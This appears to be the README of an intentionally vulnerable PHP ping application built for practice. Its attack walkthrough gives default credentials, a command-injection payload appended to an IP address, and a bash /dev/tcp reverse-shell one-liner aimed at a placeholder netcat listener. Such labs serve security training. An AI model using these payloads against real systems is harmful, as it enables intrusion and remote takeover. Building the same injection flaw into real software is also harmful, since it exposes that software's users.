# Simple Vulnerable PHP Ping Application

This application is vulnerable to a vanilla command injection post login.

## Requirements

- Apache/2.4.29
- PHP 7 or above
- Ubuntu 16.04 or similar

## Attack

- View robots.txt
- Browse to `/sysadmin/`
- Login with the credentials of `admin:123456`
- use the ping functionality available post login
- exploit command injection flaw using `127.0.0.1;id;uname -a`
- get a reverse shell using - `127.0.0.1;bash -c "bash -i >& /dev/tcp/netcat-listener-ip/9999 0>&1"` (make sure to start `nc -lvp 9999` and check if the firewall allows inbound connections to port 9999)